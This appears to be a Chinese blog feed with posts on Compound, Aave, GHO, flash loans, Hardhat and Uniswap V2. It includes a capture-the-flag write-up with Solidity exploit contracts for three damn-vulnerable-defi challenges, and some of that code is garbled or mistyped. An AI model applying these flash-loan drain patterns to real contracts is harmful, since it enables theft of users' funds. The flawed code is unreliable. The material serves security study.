        <content type="html"><![CDATA[<h1 id="Compound"><a href="#Compound" class="headerlink" title="Compound"></a>Compound</h1><p>Compound是在Ethereum上运行的软件，旨在奖励分布式计算机网络运行传统货币市场。Compound允许用户将加密货币存入借贷池让借款人使用。而贷方从他们存入的资产赚取利息。 </p><p>存款后，Compound会奖励贷方名为cToken（代表存款）的新加密货币。cToken的例子包括cETH、cBAT以及cDAI。</p><p>每个cToken都可无限转让或交易，但只能兑换最初锁定在协议中的加密货币。整个过程由Compound代码自动处理，代表贷方可以随时提币。</p><p>为了激励这个行为，Compound使用了另一种称为COMP的自家加密货币。每当用户和Compound市场互动时（借入、提取或偿还资产），作为奖励他们都会获得额外的COMP代币。</p><p>简言之，Compound 是一个允许用户借贷代币的智能合约，它与你的银行类似，Compound 把你的钱借给借款人，并随着时间的推移赚取利息。但与银行不同的是，你的利息是从你存入 Compound 的智能合约后开始复利计算的。因为这是一个智能合约，整个流程中没有中间人，因此利息会比传统银行要高。</p><h2 id="运作机制"><a href="#运作机制" class="headerlink" title="运作机制"></a>运作机制</h2><p>Compound 协议让开发者可以基于以太坊建立各种各样的货币市场（money market）。<br>所谓的「货币市场」，其实就是一个个的独立币池单元，每个币池里只有一种代币，协议通过算法来决定这个池子里的币借贷的利率是多少。简单点说，这个算法会基于人们对这个币借贷的供需关系自动计算出利率。</p><p>不管你是来贷款还是放贷，你都是在跟 Compound 协议直接打交道。这一点跟那些点对点的借贷协议不太一样。在点对点的方案里，借贷双方会做匹配，然后你需要跟找你借钱的人（或者借你钱的人）进行沟通，双方自己商定好借款的利率、到期时间和抵押物品等等。</p><p>而在 Compound 协议里，每个代币（比如 Ether、Dai、USDC）都有一个属于自己的借贷市场，里面包含每个用户在这个市场里的余额，以及各笔生效的借贷交易，乃至每段时期的历史利率，等等。</p><p>用户可以通过抵押品的信贷额度无缝地从协议上借钱，你只需要看自己要借哪个币，不需要和别人沟通还款日期、利率，就能马上借钱。借款是实时且可预测的。每个货币市场都有一个由市场决定的浮动利率。</p><h2 id="清算保证"><a href="#清算保证" class="headerlink" title="清算保证"></a>清算保证</h2><p>Compound 协议强制应用了一条规则，即每个账户必须拥有足够的余额能够偿还借款的额度，叫做<strong>抵押率</strong>。每个账户无法做出任何会使「余额／借款额度」低于「抵押率」的行为。比如再借更多的钱或者把抵押款的余额提现。要增大或者重置抵押率，用户可以全额或者部分偿还借款。任何被 Compound 持有的余额，包括用户用来做抵押品的余额，同时也会产生正常的应计利息。</p><p>如果一个用户提供的抵押资产，除以他们信用额度所借的款项，低于抵押率，那他们的抵押资产就会（通过借款资产）被出售，出售的价格是当前市场价格减去清算折扣（liquidation discount）。这个机制会激励系统里的套利者，去快速减少借款人还不了的借款资产的短缺，从而降低协议的风险。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GHO</title>
      <link href="/2024/08/19/GHO/"/>
      <url>/2024/08/19/GHO/</url>
      
        <content type="html"><![CDATA[<h1 id="GHO"><a href="#GHO" class="headerlink" title="GHO"></a>GHO</h1><p>它是 Aave 协议中唯一一个去中心化、超额抵押的稳定币，作为以太坊主网上的去中心化稳定币，GHO 由用户铸造。与 Aave 协议上的所有借贷一样，用户必须提供抵押品（按特定抵押品比率）才能铸造 GHO。相应地，当用户偿还借贷头寸（或被清算）时，GHO 将返回 Aave 池并被销毁。GHO 铸造者累积的所有利息支付将直接进入Aave DAO 金库，这与用户借入其他资产时收集的标准准备金因子形成鲜明对比，本金将被销毁。</p><p>人们对真正去中心化、超额抵押和可配置的稳定币的需求很大。最近的事件证明了去中心化稳定币在市场波动期间维持稳定价值的用例。GHO 是一种由 Aave Governance 控制的稳定币，在社区支持下，它有潜力成为 DeFi 生态系统持续增长不可或缺的一部分。</p><p>与许多稳定币不同，GHO 的预言机价格是固定的。GHO 等去中心化稳定币是透明的，无法更改。利率由 Aave DAO 定义，偿还的利息将重定向到 DAO 而不是资产供应商。在安全模块中质押 AAVE 的借款人可享受折扣。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aave学习知识</title>
      <link href="/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Aave"><a href="#Aave" class="headerlink" title="Aave"></a>Aave</h1><h2 id="Aave-1"><a href="#Aave-1" class="headerlink" title="Aave"></a>Aave</h2><p>是一种完全去中心化的、社区管理的协议，Aave 是芬兰语，意思是“幽灵”，最初于 2017 年 11 月推出时被称为 ETHLend。 ETHLend 是一个点对对点借贷系统。后来进行改进才是Aave，用户可以在其中借入和借出加密资产。协议的价值主张是创建一个可供任何拥有加密资产的人使用的替代去中心化资产货币市场。</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>Aave 是一个借贷池系统，使用户可以选择借入、借出和赚取 20 种不同数字资产的利息，而无需中间人。</p><p>想要赚取利息的用户将存入他们想要借出的资金，然后将其收集到流动性池中。当借款人贷款时，他们从这些资金池中提取资金。贷方可以以任何他们认为合适的方式交易或转让这些代币。</p><p>Aave 发行两种类型的代币来促进此活动，$AAVE（原生代币）和 aTokens。<br>$AAVE 令牌有多种使用方式：<br>1，如果支付费用，$AAVE 的所有者可以选择在向公众发布贷款之前查看贷款。</p><p>2， 使用 $AAVE 作为抵押品的用户可以比使用任何其他数字资产借入的金额略多。</p><p>3，代币持有者可以在平台上质押 $AAVE，以获得大约 6% 的 APY 分配。</p><p>aTokens 代币：</p><p>1，这些代币在存款时铸造，赎回时销毁。</p><p>2，它们与存入 Aave 协议的基础资产的价值以 1:1 的比率挂钩。</p><p>3，aTokens 为贷方提供“收据”，允许他们收取存款利息。</p><h2 id="v4"><a href="#v4" class="headerlink" title="v4"></a>v4</h2><p>今年（2024）5月，Avara 公布 Aave V4 版本的升级计划，重点放在进一步提升 Aave 的流动性与资产利用率。Aave V4 版本引入了流动性溢价功能，这是一个根据抵押品风险状况调整借款利率。为每种资产分配风险因子，依据市场和外部风险因素动态调整。风险较低的资产（如以太坊），将享受更低的借贷利率，而风险较高的资产（如山寨币）则相对提高借贷成本。</p><p>Aave V4 版本通过引入一系列创新功能，优化了借贷相关的安全性与用户体验并简化了治理流程：</p><ul><li><p>智能账户和金库的设计大幅提升了用户体验，智能账户允许用户通过单一钱包管理多个仓位。而智能账户实现的金库功能允许用户不直接向流动性层提供抵押品的情况下借款，抵押品将在借款活跃或清算事件发生时被锁定，增加了用户交互的便捷性和安全性。</p></li><li><p>V4 版本还提出了动态风险配置，以在市场条件变化时调整风险参数。用户在借款时会与资产的当前配置关联，而新的资产配置则为新用户提供，避免了影响现有借款人。此外 V4 引入了自动退市机制，简化了资产下架过程。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比银行更高级的银行，它就是一个pool,在这里可以进行存款与借款，方便，信任度高,作为去中心化金融（DeFi）借贷领域的领头羊，Aave 在资产利用率、市场占有率和交易量方面均显著领先于竞争对手，扮演着关键角色。然而，Aave 的领先地位并非不可动摇。协议如 Radiant 和 Compound 已展示出强劲的增长潜力，并推出了具有增长潜力的新版本。为了巩固其市场地位，Aave 可以采取以下策略：加强其核心借贷业务，推动 GHO 的进一步发展并于 Aave 充分融合，建立 V4 版本所设计的 Aave Network ，以及拓展其非借贷业务生态。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闪电贷</title>
      <link href="/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/"/>
      <url>/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="闪电贷"><a href="#闪电贷" class="headerlink" title="闪电贷"></a>闪电贷</h1><p>闪电贷（Flash loan）：是一种无抵押、借贷金额无上限（可以借光池中所有的钱）的贷款。它要求借贷人快借快还，快到还款和借款在同一个交易内（同一个以太坊 transaction),在我看来就是非常迅速的借款还款</p><p>首先你要借钱的话，你要写个还钱合约，里面包括了如何赚钱，还本金加利息的数目，开始借款的话，就要实现一个flashloan()闪电贷合约，这个合约首先要先进行一系列的数据验证，再调用你的还钱合约，验证你是否还了本金加利息，如果没有还上，直接 revert 整个交易，让借款无效，从而保证借出方总是安全的。实现闪电贷通常有俩个合约。</p><p>闪电贷的优点：编写闪电贷合约总体并不复杂。使用闪电贷风险也比较小。如果赚钱逻辑失败，变成了亏钱逻辑，不能完成还款，那么也不用担心借来的巨款无力偿还。整个交易将会执行失败，就如同借款从来没有发生过一样。</p><p><a href="https://www.learnblockchain.cn/article/1926">实现你第一笔闪电贷合约</a><br><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/readme.md">闪电贷的极简入门</a><br>下面是AI生成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 闪电贷</span><br><span class="line">### 同一个区块中提款可导致闪电贷攻击</span><br><span class="line">攻击者利用闪电贷的特性，在同一个区块内执行多个交易，以迅速操控市场，并从中获利，闪电贷本身就是一笔交易完成的，如果允许在同一个区块上进行提款操作，那么就正好满足攻击者的需求了</span><br><span class="line">### 闪电贷可能会操纵ERC4626</span><br><span class="line">ERC4626，即代币化的金库标准，如果底层机制没有充分考虑此类威胁，则可能容易受到闪电贷攻击。例如ERC4626没有内置的保护功能，那么闪电贷可能利用快速冻结操作</span><br><span class="line"></span><br><span class="line">闪电贷（Flash Loan）是一种新兴的金融工具，允许用户在不需要抵押物的情况下借入大量资金，但必须在同一交易中偿还。这种机制最初由去中心化金融（DeFi）平台引入，为交易者提供了灵活性和机会。然而，闪电贷也可能被利用来进行攻击，形成所谓的“闪电贷攻击”。以下是对闪电贷借贷漏洞的细分描述：</span><br><span class="line">1. 闪电贷的基本原理</span><br><span class="line"></span><br><span class="line">1.借贷过程：用户在去中心化交易所（如Aave或 dYdX）申请借款，借款不需要抵押物，但必须在同一交易区块内还款。</span><br><span class="line">2.短期性：借款的时间极短，通常在几秒钟内完成。</span><br><span class="line">3.应用场景：可以用于套利、清算其他借贷、快速交易等。</span><br><span class="line"></span><br><span class="line">2. 闪电贷攻击的类型</span><br><span class="line">a. 套利攻击</span><br><span class="line"></span><br><span class="line">4.概念：借款者利用价格差异在不同平台上进行套利。</span><br><span class="line">5.示例：攻击者在一个交易所低价购买资产，然后在另一个交易所高价出售，以此获取利润。</span><br><span class="line"></span><br><span class="line">b. 价格操控</span><br><span class="line"></span><br><span class="line">6.概念：攻击者利用闪电贷大量借入资产并瞬间买入或卖出，操纵市场价格。</span><br><span class="line">7.示例：通过大规模购买某种代币推高其价格，然后在高价位出售所持代币，导致价格回落，形成利润。</span><br><span class="line"></span><br><span class="line">c. 清算攻击</span><br><span class="line"></span><br><span class="line">8.概念：借款者在去中心化借贷平台上利用闪电贷清算其他用户的抵押资产。</span><br><span class="line">9.示例：当某个用户的抵押物价值降低到一定程度，攻击者可以借入资金清算该用户的抵押物，以获得折扣资产。</span><br><span class="line"></span><br><span class="line">3. 闪电贷漏洞的成因</span><br><span class="line">a. 缺乏抵押要求</span><br><span class="line"></span><br><span class="line">10.问题：由于不需要抵押物，攻击者可以在短时间内借入大量资金。</span><br><span class="line">11.后果：使得平台的风险管理机制受到挑战。</span><br><span class="line"></span><br><span class="line">b. 市场价格不稳定</span><br><span class="line"></span><br><span class="line">12.问题：去中心化市场的流动性和价格稳定性较差，容易受到操控。</span><br><span class="line">13.后果：导致价格瞬间波动，从而为套利提供机会。</span><br><span class="line"></span><br><span class="line">c. 智能合约漏洞</span><br><span class="line"></span><br><span class="line">14.问题：智能合约可能存在代码缺陷或安全漏洞，攻击者可以利用这些缺陷执行恶意操作。</span><br><span class="line">15.后果：可能导致资产损失或协议失效。</span><br><span class="line"></span><br><span class="line">4. 防范措施</span><br><span class="line"></span><br><span class="line">16.审计智能合约：定期进行代码审计，以发现和修复潜在漏洞。</span><br><span class="line">17.流动性管理：加强市场流动性管理，避免价格剧烈波动。</span><br><span class="line">18.增加抵押要求：在某些情况下，考虑增加最低抵押要求，以降低风险。</span><br><span class="line"></span><br><span class="line">5. 总结</span><br><span class="line">闪电贷为DeFi生态系统带来了新的机遇，但也伴随着相应的风险。了解闪电贷的机制和潜在攻击方式，对于用户和开发者而言，都是至关重要的。通过合理的风险控制措施，可以在一定程度上减轻闪电贷带来的安全隐患。</span><br></pre></td></tr></table></figure><h3 id="用户处于无法还清贷款状态"><a href="#用户处于无法还清贷款状态" class="headerlink" title="用户处于无法还清贷款状态"></a>用户处于无法还清贷款状态</h3><p>某些情况或条件可能会阻止用户偿还贷款，从而导致他们永远负债累累。这可能是由于过度抵押、高额费用、代币价值波动或其他不可预见的事件等因素造成的。</p><h3 id="借出借入相同的代币"><a href="#借出借入相同的代币" class="headerlink" title="借出借入相同的代币"></a>借出借入相同的代币</h3><p>允许在单笔交易中借出和借入相同代币的协议可能容易受到利用快速价格通胀或闪电贷来操纵系统的攻击。</p><h3 id="自我清算"><a href="#自我清算" class="headerlink" title="自我清算"></a>自我清算</h3><p>1，自我清算的利润漏洞可能导致潜在的系统滥用和意想不到的财务后果。<br>2，如果暂停清算，会增加偿付能力风险，并导致复牌后出现不可预测的行为。<br>3，可能存在清算人厚道的金额低于预期情况，影响系统的稳定性</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>damn-vulnerable-defi题解</title>
      <link href="/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-vulnerable-defi"><a href="#Damn-vulnerable-defi" class="headerlink" title="Damn-vulnerable-defi"></a><a href="https://www.damnvulnerabledefi.xyz/">Damn-vulnerable-defi</a></h1><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>要求是，使拥有一百万DVI的钱包停止闪电贷的功能</p><p>分析：这个合约的代码在gittub上，要分开去看，这道题的解决就是靠一个基本的闪电贷的知识<br>首先要看闪电贷的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)</span><br><span class="line">       external</span><br><span class="line">       returns (bool)</span><br><span class="line">   &#123;</span><br><span class="line">       if (amount == 0) revert InvalidAmount(0); // fail early</span><br><span class="line">       if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement</span><br><span class="line">       uint256 balanceBefore = totalAssets();</span><br><span class="line">       if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement</span><br><span class="line"></span><br><span class="line">       // transfer tokens out + execute callback on receiver</span><br><span class="line">       ERC20(_token).safeTransfer(address(receiver), amount);</span><br><span class="line"></span><br><span class="line">       // callback must return magic value, otherwise assume it failed</span><br><span class="line">       uint256 fee = flashFee(_token, amount);</span><br><span class="line">       if (</span><br><span class="line">           receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)</span><br><span class="line">               != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)</span><br><span class="line">       ) &#123;</span><br><span class="line">           revert CallbackFailed();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // pull amount + fee from receiver, then pay the fee to the recipient</span><br><span class="line">       ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);</span><br><span class="line">       ERC20(_token).safeTransfer(feeRecipient, fee);</span><br><span class="line"></span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>revert的关键：  <code>convertToShares(totalSupply) != balanceBefore</code>，首先来看这个totalSupply,很熟悉，在ERC20中见过，又整体看这个合约，其实是继承了ERC20，totalSupply在ERC4626中定义了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ERC4626部分合约</span><br><span class="line"></span><br><span class="line">function convertToShares(uint assets) public view virtual returns (uint256)&#123;</span><br><span class="line">    uint256 supply = totalSupply;</span><br><span class="line">    return supply = 0 ? assets : assets.mulDivDown(supply,talalAssets());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>totalAssets()：计算的是当前金库中的资产代币数目</li><li>convertToShares(totalSupply)：totalSupply 是总的 share 代币数目（只有 deposit 或 mint 时才会产生），convertToShares 就是计算：assets * totalSupply &#x2F;totalAssets ()</li></ul><p>从中我们可以看到 supply&#x3D;assets*supply&#x2F;talalAssets(),如果我们让talalAssets()总数增加，而assets不变，就能满足convertToShares(totalSupply) !&#x3D; balanceBefore，所以就只要不通过 depost 或 mint 方法向 UnstoppableVault 中转入 token 即可</p><p>方法：在<strong>Unstoppable.t.sol</strong>测试合约中写我们的攻击合约,记得找对位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * CODE YOUR SOLUTION HERE</span><br><span class="line"> */</span><br><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    vm.startPrank(player);</span><br><span class="line">    taken.transfer(address(vault),1) </span><br><span class="line">    vm.stopPrank();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH</span><br><span class="line"> */</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h2><p>要求是，掏空一个用户已经部署的合约上的ETH</p><p>分析，部署合约，pool的闪电贷手续费为1eth,receiver已经有了10eth,要使 receiver 中的余额为 0，pool 中的余额为 1000+10eth，就是因此只需通过 receiver 向 pool 执行十次闪电贷即可把 10eth 全部通过手续费的方式转给 pool</p><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../src/naive-receiver/FlashLoanReceiver.sol&quot;;</span><br><span class="line">import &quot;../../src/naive-receiver/NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    constructor(address payable _pool, address payable _receiver)&#123;</span><br><span class="line">        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);</span><br><span class="line">        for(uint256 i=0; i&lt;10; i++)&#123;</span><br><span class="line">            pool.flashLoan(IERC3156FlashBorrower(_receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, &quot;0x&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>要求是，获取这个池中的全部DIV</p><p>分析：看整个合约，还是挺简单的，也易读易懂，flashLoan合约中，实现了简单的合约代码，执行回调的函数就是 target.functionCall(data);主要从这个入手，攻击合约如下：</p><pre><code>pragam solidityb ^0.8.0;import&quot;./TusterLenderPool.sol&quot;;import&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;interface ITusterLenderPool&#123;    function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data);&#125;contract TusterExploit&#123;   ITusterlenerPool cons;   address pool;   uint256 balanceof;   address tokenaddress;   constractor (address _pool,address _tokenaddress,uint256 Balanceof)   &#123;    cons = ITusterLenderPool(_pool);    pool = _pool;    tokenaddress = _tokenaddress;    balanceof = Balanceof;   &#125;   function hack() public &#123;    cons.flashLoan(0,msg.sender,tokenaddress,abi.codeWithSigner(&quot;appove(address,uint256)&quot;,address(this),balanceof));    IERC20 token  = IERC20(tokenaddress);    token.transferFrom(pool,msg.sender,balanceof);   &#125;&#125;pragma solidity ^0.8.0;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hardhat</title>
      <link href="/2024/08/06/hardhat/"/>
      <url>/2024/08/06/hardhat/</url>
      
        <content type="html"><![CDATA[<h1 id="hardhat"><a href="#hardhat" class="headerlink" title="hardhat"></a>hardhat</h1><p><strong>hardhat</strong>就是以太坊开发环境，如同remix,现在介绍一下安装<strong>hardhat</strong>的步骤</p><ul><li>打开终端，win+r,输入cmd</li><li>检查node js,安装没有，<code>node -v</code> (没有安装去官网下载)</li><li>建一个文件夹，在终端输入<code>mkdir hardhat-tutorial</code>，然后进入文件夹，<code>cd hardhat-tutorial</code></li><li>进行初始化，<code>npm init</code>，接下来一直按enter,直到出现<code>Is this OK? (yes)</code>,回答yes即可</li><li>安装<strong>hardhat</strong> <code>npm install --save-dev hardhat</code>,需要等待几秒</li><li>再安装一个插件 npm install –save-dev @nomicfoundation&#x2F;hardh<br>at-toolbox<br>s</li></ul><h2 id="编写合同"><a href="#编写合同" class="headerlink" title="编写合同"></a>编写合同</h2><p>安装完成后，因为使用VScode,所以我们要安装一个VScode 安全帽，它可以帮组我们更好的使用solidity语言，然后在VScode创建一个新目录，写一个简单的.sol合约，在终端中运行该合约，<code>npx hardhat compile,</code>成功后就会看到<code>Compiled 1 Solidity file successfully (evm target: paris).</code></p><h2 id="测试合约"><a href="#测试合约" class="headerlink" title="测试合约"></a>测试合约</h2><p><code>npx hardhat test</code>,如果你想看到solidity的日志消息，合约变量，必须导入<code>hardhat/console.sol</code>合约代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">  //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再添加一些对该函数console.log的调用transfer()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= amount, &quot;Not enough tokens&quot;);</span><br><span class="line"></span><br><span class="line">    console.log(</span><br><span class="line">        &quot;Transferring from %s to %s %s tokens&quot;,</span><br><span class="line">        msg.sender,</span><br><span class="line">        to,</span><br><span class="line">        amount</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] -= amount;</span><br><span class="line">    balances[to] += amount;</span><br><span class="line"></span><br><span class="line">    emit Transfer(msg.sender, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结，hardhat就是能轻松部署我们的合约、运行测试和调试 Solidity 代码，无需处理实时环境，更多知识请参考<a href="https://hardhat.org/">hardhat</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Uniswap V2</title>
      <link href="/2024/08/06/uniswap-V2/"/>
      <url>/2024/08/06/uniswap-V2/</url>
      
        <content type="html"><![CDATA[<h1 id="Uniswap-V2"><a href="#Uniswap-V2" class="headerlink" title="Uniswap V2"></a>Uniswap V2</h1><p><strong>Uniswap</strong>是一种流行的去中心化交易所 (DEX)协议，允许用户将任何 ERC20 代币交换为另一种代币，提供流动性以赚取费用，并访问以太坊区块链上的价格预言机。 而Uniswap V2具有更强大的功能，如下：</p><ul><li>它允许任何的ERC20代币与其他的ERC20代币配对，无需ETH作为中介，这使得流动性池更加多样化和高效，并为交易者提供更好的价格。 就是一种代币可与其他的代币转化，方便很多</li><li>Uniswap V2 实施了一种新颖的机制，可实现高度去中心化且抗操纵的链上价格供给。 这是通过在每个区块开始时测量两种资产的相对价格并随着时间的推移积累历史数据来实现的。 这允许外部智能合约查询任何时间间隔内任何货币对的时间加权平均价格（TWAP），同时将天然气成本和预言机风险降至最低。</li><li>Uniswap V2 支持一种称为闪电互换的新型交易，用户可以从池中接收任意数量的任何资产，并在链上的其他地方使用它，只要他们在交易结束时偿还该金额并支付费用即可。 交易。 这为套利、保证金交易、抵押品互换等开辟了新的可能性。</li></ul><p>每个Uniswap智能合约或一对智能合约都管理由两个ERC-20代币的储备组成的流动资金池。</p><p>同时它也有很多好处：</p><ul><li>低费用：Uniswap V2 对每笔交易收取 0.3% 的固定费用，该费用由所有流动性提供者按其在池中的权益比例分配。 该费用低于大多数中心化交易所和其他 DEX 协议，这使得 Uniswap V2 成为中小额交易的有吸引力的选择。</li><li>高流动性：Uniswap V2 利用以太坊及其庞大的 ERC20 代币生态系统的网络效应，为任何代币对提供高流动性。 任何人都可以通过提供一定数量的两种代币来创建新的货币对或加入现有的货币对，从而增加池的深度和可用性。 此外，Uniswap V2 采用自动做市商（AMM）模型，根据供需情况调整价格，确保任何交易规模始终有足够的流动性。</li><li>无许可访问：Uniswap V2 是<strong>完全去中心化和非托管的</strong>，这意味着任何人都可以使用它，而无需注册帐户、验证身份或信任第三方使用其资金。 用户可以完全控制自己的资产，可以随时进行交易或提供流动性，而无需担心停机、审查或黑客攻击。</li><li>透明定价：Uniswap V2 采用简单透明的定价机制，由恒定乘积公式和矿池当前准备金余额决定。 用户可以轻松计算他们将收到或支付任何交易的确切代币数量，没有任何隐藏费用或滑点。 用户还可以根据池的历史数据访问任何货币对的可靠且无需信任的价格预言机。</li></ul><p>要使用Uniswap V2可在<a href="https://uniswap.org/">官网</a>上访问,可以自己创建一个Uniswap钱包，一定要记住<strong>私钥</strong></p><p>流动性提供者的结构和合约之间的交互涉及多个概念和机制，以下是详细的解释：</p><h1 id="流动性提供者的结构"><a href="#流动性提供者的结构" class="headerlink" title="流动性提供者的结构"></a>流动性提供者的结构</h1><ol><li><p><strong>流动性提供者（LP）</strong>：</p><ul><li>流动性提供者是向去中心化交易所（DEX）提供资产的用户，以便交易者可以在该平台上进行交易。</li><li>LP 将两种代币（例如 USDC 和 SAFU）存入流动性池，作为回报，他们会获得流动性池代币（LP 代币），这些代币代表他们在池中的份额。</li></ul></li><li><p><strong>流动性池</strong>：</p><ul><li>流动性池是智能合约，存储了两种代币，允许用户以自动化方式进行交易。</li><li>交易者在池中买入或卖出代币，池中的资产根据交易的供需情况进行调整。</li></ul></li><li><p><strong>流动性池代币（LP 代币）</strong>：</p><ul><li>当用户提供流动性时，会获得相应的 LP 代币，表示他们在流动性池中的份额。</li><li>LP 代币可以用于其他操作，比如质押、获取奖励或进行再投资。</li></ul></li></ol><h3 id="合约之间的交互"><a href="#合约之间的交互" class="headerlink" title="合约之间的交互"></a>合约之间的交互</h3><ol><li><p><strong>流动性添加</strong>：</p><ul><li>LP 通过调用路由合约（例如 Uniswap 的 Router 合约）进行流动性添加。</li><li>路由合约会将 LP 的代币存入流动性池合约，并铸造 LP 代币。</li></ul></li><li><p><strong>交易</strong>：</p><ul><li>当交易者进行交易时，他们通过路由合约交换代币。路由合约会调用流动性池合约来更新池中的资产。</li><li>交易的执行会根据预设的算法（如自动做市商算法）调整池中代币的比例。</li></ul></li><li><p><strong>流动性移除</strong>：</p><ul><li>LP 可以选择移除他们的流动性，通过调用路由合约并指定 LP 代币数量。</li><li>路由合约会验证 LP 代币的有效性，并将相应的基础代币返回给 LP。</li></ul></li><li><p><strong>费用和奖励</strong>：</p><ul><li>每笔交易都会产生一定的交易费用，这些费用会分配给流动性提供者，作为他们提供流动性的奖励。</li><li>LP 代币也可以用于其他合约（例如收益农场或流动性挖矿合约），进一步增加收益。</li></ul></li></ol><h3 id="示例流程"><a href="#示例流程" class="headerlink" title="示例流程"></a>示例流程</h3><p>假设一个用户（LP）希望在 Uniswap 上提供流动性：</p><ol><li><p><strong>流动性添加</strong>：</p><ul><li>用户决定存入 1000 USDC 和 1 SAFU 代币。</li><li>调用 <code>addLiquidity</code> 函数，将代币发送到 Uniswap 的 Router 合约。</li><li>Router 合约会向流动性池合约转移代币，并返回相应的 LP 代币。</li></ul></li><li><p><strong>进行交易</strong>：</p><ul><li>用户或其他人可以在 Uniswap 上进行代币交换。</li><li>Router 合约会找到最佳路径并调用流动性池合约来执行交换。</li></ul></li><li><p><strong>流动性移除</strong>：</p><ul><li>用户希望取回他们的流动性，通过调用 <code>removeLiquidity</code>。</li><li>Router 合约会验证 LP 代币，并返回用户存入的相应数量的代币。</li></ul></li><li><p><strong>获得交易费用</strong>：</p><ul><li>交易过程中产生的手续费会根据用户在流动性池中的份额自动分配给他们。</li></ul></li></ol><h3 id="攻击者如何利用这些结构"><a href="#攻击者如何利用这些结构" class="headerlink" title="攻击者如何利用这些结构"></a>攻击者如何利用这些结构</h3><p>攻击者可以利用 LP 代币的流动性和合约之间的交互来执行攻击，例如：</p><ul><li><strong>通过高频交易</strong>：利用流动性池中的不平衡，进行高频交易来获利。</li><li><strong>利用价格操控</strong>：通过添加或移除流动性来操控价格，进而影响市场。</li><li><strong>奖励套利</strong>：转移 LP 代币到其他合约（例如收益农场）以获得额外奖励。</li></ul><p>这种合约之间的交互和流动性提供者的结构使得去中心化交易所能够高效运行，但同时也为攻击者提供了潜在的攻击向量。</p><p>Uniswap V2的思考<br>Uniswap通过 x * y &#x3D; k 